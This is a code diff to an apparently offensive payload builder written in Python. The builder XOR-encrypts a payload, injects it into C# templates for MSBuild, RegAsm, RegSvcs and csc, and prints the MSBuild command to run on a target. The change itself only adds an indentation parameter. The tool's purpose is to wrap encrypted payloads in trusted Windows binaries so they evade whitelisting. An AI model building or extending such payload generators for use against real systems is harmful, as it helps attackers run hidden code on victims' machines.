@@ -123,7 +123,8 @@ def _ps_args(assembly_args):
 # --- C# LOLBin builder (shared by 6 payload types) ---
 
 def _build_csharp(args, assembly_args, template_file, output_file,
-                  indent=8, is_msbuild=False, ascii_enforce=False):
+                  indent=8, is_msbuild=False, ascii_enforce=False,
+                  body_indent=None):
     _validate_keying(args)
     _validate_type_method(args)
 
@@ -137,7 +138,8 @@ def _build_csharp(args, assembly_args, template_file, output_file,
     print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
 
     if args.encryption == "xor":
-        template = patch_csharp_for_xor(template, indent=indent, is_msbuild=is_msbuild)
+        template = patch_csharp_for_xor(template, indent=indent, is_msbuild=is_msbuild,
+                                       body_indent=body_indent)
         template = inject_placeholders(template, {
             '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
             '"YOURKEYHERE"': f'"{key_b64}"',
@@ -218,6 +220,7 @@ def build_msbuild(args, assembly_args):
         template_file="msbuild_payload.csproj",
         output_file="msbuild_ready.csproj",
         indent=4, is_msbuild=True, ascii_enforce=True,
+        body_indent=12,
     )
     print(f"[*] On target:", file=sys.stderr)
     print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
@@ -468,7 +471,8 @@ def build_regasm(args, assembly_args):
         args, assembly_args,
         template_file="regasm_payload.cs",
         output_file="payload_ready.cs",
-        indent=8,
+        indent=4,
+        body_indent=12,
     )
     if args.compile:
         _compile_cs(output_path, target="library")
@@ -483,7 +487,8 @@ def build_regsvcs(args, assembly_args):
         args, assembly_args,
         template_file="regsvcs_payload.cs",
         output_file="payload_ready.cs",
-        indent=8,
+        indent=4,
+        body_indent=12,
     )
     if args.compile:
         _compile_cs_strong(output_path, args)
@@ -498,7 +503,8 @@ def build_csc(args, assembly_args):
         args, assembly_args,
         template_file="csc_payload.cs",
         output_file="payload_ready.cs",
-        indent=8,
+        indent=4,
+        body_indent=12,
     )
     if args.compile:
         _compile_cs(output_path, target="exe")
